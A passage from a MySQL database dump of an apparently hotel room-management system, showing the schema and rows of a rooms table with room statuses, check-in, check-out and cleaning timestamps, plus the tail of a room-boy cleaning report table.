09:13:48','2025-11-20 09:30:44',17,0,'AM',1,'2025-11-20 09:13:48','2025-11-20 09:30:44'),(11,1,209,12,7,'2025-11-20 09:30:51','2025-11-20 10:44:09',74,0,'AM',1,'2025-11-20 09:30:51','2025-11-20 10:44:09'),(12,1,17,1,7,'2025-11-20 10:44:16','2025-11-20 11:08:54',25,0,'AM',1,'2025-11-20 10:44:16','2025-11-20 11:08:54'),(13,1,1,14,7,'2025-11-20 11:08:57','2025-11-20 13:09:45',121,0,'AM',1,'2025-11-20 11:08:57','2025-11-20 13:09:45'),(14,1,205,16,7,'2025-11-20 13:09:50','2025-11-20 13:26:35',17,0,'AM',1,'2025-11-20 13:09:50','2025-11-20 13:26:35'),(15,1,23,2,7,'2025-11-20 13:27:07','2025-11-20 14:04:21',38,0,'AM',1,'2025-11-20 13:27:07','2025-11-20 14:04:21'),(16,1,7,15,7,'2025-11-20 14:04:25','2025-11-20 14:21:59',18,0,'AM',1,'2025-11-20 14:04:25','2025-11-20 14:21:59'),(17,1,7,15,7,'2025-11-20 14:22:03','2025-11-20 14:37:03',0,0,'AM',0,'2025-11-20 14:22:03','2025-11-20 14:22:03');
/*!40000 ALTER TABLE `room_boy_reports` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `rooms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `rooms` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `floor_id` bigint unsigned NOT NULL,
  `number` varchar(250) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `area` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT 'Main',
  `status` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'available',
  `type_id` bigint unsigned NOT NULL,
  `is_priority` tinyint(1) NOT NULL DEFAULT '0',
  `last_checkin_at` datetime DEFAULT NULL,
  `last_checkout_at` datetime DEFAULT NULL,
  `time_to_terminate_queue` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `check_out_time` datetime DEFAULT NULL,
  `time_to_clean` datetime DEFAULT NULL,
  `started_cleaning_at` datetime DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=215 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `rooms` WRITE;
/*!40000 ALTER TABLE `rooms` DISABLE KEYS */;
INSERT INTO `rooms` VALUES (1,1,1,'1','Main','Uncleaned',2,1,'2025-11-20 09:49:06','2025-11-20 10:14:04',NULL,'2025-11-20 10:14:04','2025-11-20 17:46:15',NULL,'2025-11-18 14:23:00','2025-11-20 14:46:15'),(2,1,1,'10','Main','Occupied',2,0,'2025-11-20 11:10:53','2025-11-20 13:11:54',NULL,'2025-11-20 13:11:54','2025-11-20 16:11:54',NULL,'2025-11-18 14:23:00','2025-11-20 13:15:46'),(3,1,1,'11','Main','Occupied',2,1,'2025-11-19 09:42:32','2025-11-19 09:56:52',NULL,'2025-11-19 09:56:52',NULL,NULL,'2025-11-18 14:23:00','2025-11-20 10:55:52'),(4,1,1,'12','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:33'),(5,1,1,'14','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(6,1,1,'15','Main','Cleaned',2,1,'2025-11-19 15:38:37','2025-11-19 15:39:05',NULL,'2025-11-19 15:39:05',NULL,NULL,'2025-11-18 14:23:00','2025-11-20 11:27:36'),(7,1,1,'16','Main','Cleaning',3,0,'2025-11-20 10:17:22','2025-11-20 10:43:55',NULL,'2025-11-20 10:43:55',NULL,'2025-11-20 14:22:03','2025-11-18 14:23:00','2025-11-20 14:22:03'),(8,1,1,'17','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(9,1,1,'18','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(10,1,1,'19','Main','Uncleaned',3,0,NULL,NULL,NULL,NULL,'2025-11-20 15:02:09',NULL,'2025-11-18 14:23:00','2025-11-20 12:02:09'),(11,1,1,'2','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(12,1,1,'20','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(13,1,1,'21','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(14,1,1,'22','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(15,1,1,'23','Main','Uncleaned',3,0,'2025-11-20 11:11:19','2025-11-20 15:46:45',NULL,'2025-11-20 15:46:45','2025-11-20 18:46:45',NULL,'2025-11-18 14:23:00','2025-11-20 15:46:45'),(16,1,1,'24','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(17,1,1,'25','Main','Uncleaned',1,1,'2025-11-20 11:10:24','2025-11-20 11:16:03',NULL,'2025-11-20 11:16:03','2025-11-20 14:16:03',NULL,'2025-11-18 14:23:00','2025-11-20 11:16:03'),(18,1,1,'26','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(19,1,1,'27','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(20,1,1,'28','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(21,1,1,'29','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(22,1,1,'3','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(23,1,1,'30','Main','Uncleaned',1,1,'2025-11-18 15:02:56','2025-11-19 08:49:32',NULL,'2025-11-19 08:49:32','2025-11-20 17:23:56',NULL,'2025-11-18 14:23:00','2025-11-20 14:23:56'),(24,1,1,'31','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(25,1,1,'32','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(26,1,1,'33','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(27,1,1,'34','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(28,1,1,'35','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(29,1,1,'36','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(30,1,1,'37','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(31,1,1,'38','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(32,1,1,'39','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(33,1,1,'4','Main','Uncleaned',1,0,NULL,NULL,NULL,NULL,'2025-11-20 14:23:43',NULL,'2025-11-18 14:23:00','2025-11-20 11:23:43'),(34,1,1,'5','Main','Uncleaned',1,1,'2025-11-20 14:10:58','2025-11-20 16:08:05',NULL,'2025-11-20 16:08:05','2025-11-20 19:08:05',NULL,'2025-11-18 14:23:00','2025-11-20 16:08:05'),(35,1,1,'50','Main','Uncleaned',3,1,'2025-11-21 21:30:17','2025-11-21 21:31:28',NULL,'2025-11-21 21:31:28','2025-11-22 00:31:28',NULL,'2025-11-18 14:23:00','2025-11-21 21:31:28'),(36,1,1,'51','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(37,1,1,'52','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(38,1,1,'53','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(39,1,1,'6','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(40,1,1,'7','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(41,1,1,'8','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(42,1,1,'9','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(43,1,2,'100','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:33'),(44,1,2,'101','Main','Uncleaned',2,1,NULL,NULL,NULL,NULL,'2025-11-20 19:07:39',NULL,'2025-11-18 14:23:00','2025-11-20 16:07:39'),(45,1,2,'60','Main','Occupied',1,1,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:40:03'),(46,1,2,'61','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(47,1,2,'62','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(48,1,2,'63','Main','Uncleaned',1,1,NULL,NULL,NULL,NULL,'2025-11-20 19:10:32',NULL,'2025-11-18 14:23:00','2025-11-20 16:10:32'),(49,1,2,'64','Main','Uncleaned',1,1,'2025-11-20 13:19:32','2025-11-20 15:50:24',NULL,'2025-11-20 15:50:24','2025-11-20 18:50:24',NULL,'2025-11-18 14:23:00','2025-11-20 15:50:24'),(50,1,2,'65','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(51,1,2,'66','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(52,1,2,'67','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(53,1,2,'68','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(54,1,2,'69','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(55,1,2,'70','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(56,1,2,'71','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(57,1,2,'72','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(58,1,2,'73','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(59,1,2,'74','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(60,1,2,'75','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(61,1,2,'76','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(62,1,2,'77','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(63,1,2,'78','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(64,1,2,'79','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(65,1,2,'80','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(66,1,2,'81','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(67,1,2,'82','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(68,1,2,'83','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(69,1,2,'84','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(70,1,2,'85','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(71,1,2,'86','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(72,1,2,'87','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(73,1,2,'88','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(74,1,2,'89','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(75,1,2,'90','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(76,1,2,'91','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(77,1,2,'92','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(78,1,2,'93','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(79,1,2,'94','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(80,1,2,'95','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(81,1,2,'96','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(82,1,2,'97','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(83,1,2,'98','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(84,1,2,'99','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(85,1,3,'120','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:34'),(86,1,3,'121','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:34'),(87,1,3,'122','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:35'),(88,1,3,'123','Main','Uncleaned',1,1,'2025-11-20 16:09:44','2025-11-20 16:10:54',NULL,'2025-11-20 16:10:54','2025-11-20 19:10:54',NULL,'2025-11-18 14:23:00','2025-11-20 16:10:54'),(89,1,3,'124','Main','Occupied',1,1,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-20 14:46:15'),(90,1,3,'125','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:35'),(91,1,3,'126','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:36'),(92,1,3,'127','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:36'),(93,1,3,'128','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:37'),(94,1,3,'129','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:37'),(95,1,3,'130','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(96,1,3,'131','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:37'),(97,1,3,'132','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:39'),(98,1,3,'133','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(99,1,3,'134','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:39'),(100,1,3,'135','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:40'),(101,1,3,'136','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-21 21:03:41'),(102,1,3,'137','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(103,1,3,'138','Main','Available',2,1,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-20 13:23:50'),(104,1,3,'139','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(105,1,3,'150','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(106,1,3,'151','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(107,1,3,'152','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(108,1,3,'153','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(109,1,3,'154','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(110,1,3,'155','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(111,1,3,'156','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(112,1,3,'157','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(113,1,3,'158','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(114,1,3,'159','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(115,1,3,'160','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(116,1,3,'161','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(117,1,3,'162','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(118,1,3,'163','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(119,1,3,'164','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(120,1,3,'165','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(121,1,3,'166','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(122,1,3,'167','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(123,1,3,'168','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(124,1,3,'169','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(125,1,3,'170','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(126,1,3,'171','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(127,1,4,'200','Main','Occupied',3,1,'2025-11-18 15:05:46','2025-11-19 08:52:40',NULL,'2025-11-19 08:52:40',NULL,NULL,'2025-11-18 14:23:00','2025-11-21 20:57:02'),(128,1,4,'201','Main','Uncleaned',2,1,'2025-11-21 20:59:50','2025-11-21 21:01:47',NULL,'2025-11-21 21:01:47','2025-11-22 00:01:47',NULL,'2025-11-18 14:23:00','2025-11-21 21:01:47'),(129,1,4,'202','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(130,1,4,'203','Main','Available',1,1,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-20 13:08:08'),(131,1,4,'204','Main','Available',1,1,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-20 13:08:01'),(132,1,4,'205','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(133,1,4,'206','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(134,1,4,'207','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(135,1,4,'208','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(136,1,4,'209','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(137,1,4,'210','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(138,1,4,'211','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(139,1,4,'212','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(140,1,4,'214','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(141,1,4,'215','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(142,1,4,'216','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(143,1,4,'217','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(144,1,4,'218','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(145,1,4,'219','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(146,1,4,'220','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(147,1,4,'221','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(148,1,4,'222','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(149,1,4,'223','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(150,1,4,'224','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(151,1,4,'225','Main','Available',3,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(152,1,4,'226','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(153,1,4,'227','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(154,1,4,'228','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(155,1,4,'229','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(156,1,4,'230','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(157,1,4,'231','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(158,1,4,'232','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(159,1,4,'233','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(160,1,4,'234','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(161,1,4,'235','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(162,1,4,'236','Main','Cleaned',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-20 11:25:27'),(163,1,4,'237','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(164,1,4,'238','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(165,1,4,'239','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(166,1,4,'250','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(167,1,4,'251','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(168,1,5,'253','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(169,1,5,'254','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(170,1,5,'255','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(171,1,5,'256','Main','Available',1,1,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-20 13:08:16'),(172,1,5,'257','Main','Uncleaned',1,1,NULL,NULL,NULL,NULL,'2025-11-20 18:49:25',NULL,'2025-11-18 14:23:00','2025-11-20 15:49:25'),(173,1,5,'258','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(174,1,5,'259','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(175,1,5,'260','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(176,1,5,'261','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(177,1,5,'262','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(178,1,5,'263','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(179,1,5,'264','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(180,1,5,'265','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 